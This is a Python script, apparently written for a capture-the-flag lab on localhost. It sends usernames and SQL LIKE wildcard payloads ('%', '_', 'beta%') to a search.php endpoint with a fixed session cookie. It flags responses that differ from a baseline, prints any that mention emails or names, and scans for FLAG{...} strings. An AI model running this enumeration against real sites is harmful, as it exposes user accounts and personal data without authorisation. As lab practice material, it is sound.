import requests
import re

# Target configuration
url = "http://127.0.0.1:8080/search.php"
cookies = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}

# Baseline response
baseline = "You are connected successfully!<br/> No results"

# Test usernames
test_usernames = [
    # Common names
    "alice", "bob", "charlie", "david", "eve", "admin", "user", "test", "guest",
    # Beta-related
    "beta", "betauser", "betatester", "beta_user", "beta-user", "betaprogram",
    # Numbered variants
    "user1", "user2", "admin1", "test1",
    # Wildcards
    "%", "_", "%%", "___",
    # Wildcard combinations
    "beta%", "%beta", "%beta%", "beta_", "_beta", "a%", "b%", "c%", "d%", "e%",
    # More specific patterns
    "beta%user", "beta%test", "%tester"
]

print(f"[*] Testing {len(test_usernames)} usernames against {url}")
print(f"[*] Baseline response: '{baseline}'")
print(f"[*] Looking for responses that differ from baseline\n")

different_responses = []
response_groups = {}

for username in test_usernames:
    try:
        data = {"username": username}
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        
        status = response.status_code
        length = len(response.text)
        content = response.text.strip()
        
        # Check if response differs from baseline
        is_different = content != baseline.strip()
        
        # Group by response content for pattern analysis
        content_key = content[:200] if len(content) > 200 else content
        if content_key not in response_groups:
            response_groups[content_key] = []
        response_groups[content_key].append(username)
        
        if is_different:
            print(f"[+] DIFFERENT: username='{username}'")
            print(f"    Status: {status} | Length: {length}B")
            print(f"    Response: {content}")
            print()
            different_responses.append({
                "username": username,
                "status": status,
                "length": length,
                "content": content
            })
        else:
            # Just count baseline responses
            pass
            
    except Exception as e:
        print(f"[!] ERROR testing '{username}': {e}")

print("\n" + "="*60)
print("SUMMARY")
print("="*60)

print(f"\n[*] Total usernames tested: {len(test_usernames)}")
print(f"[*] Different responses found: {len(different_responses)}")
print(f"[*] Unique response patterns: {len(response_groups)}")

if different_responses:
    print("\n[!] NON-BASELINE RESPONSES:")
    for result in different_responses:
        print(f"  - '{result['username']}': {result['status']} | {result['length']}B")
        # Extract any user info from response
        if "email" in result['content'].lower() or "name" in result['content'].lower():
            print(f"    Content preview: {result['content'][:500]}")
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', result['content'])
        if flag_match:
            print(f"    [!!!] FLAG FOUND: {flag_match.group(0)}")

print("\n[*] Response pattern groups:")
for idx, (content_pattern, usernames) in enumerate(response_groups.items(), 1):
    print(f"\n  Pattern {idx} ({len(usernames)} usernames):")
    print(f"    Usernames: {', '.join(usernames[:10])}")
    if len(usernames) > 10:
        print(f"    ... and {len(usernames) - 10} more")
    if content_pattern != baseline.strip():
        print(f"    Content preview: {content_pattern[:300]}")
        
        # Check for FLAG in this pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', content_pattern)
        if flag_match:
            print(f"    [!!!] FLAG IN THIS PATTERN: {flag_match.group(0)}")

print("\n[*] Testing complete")

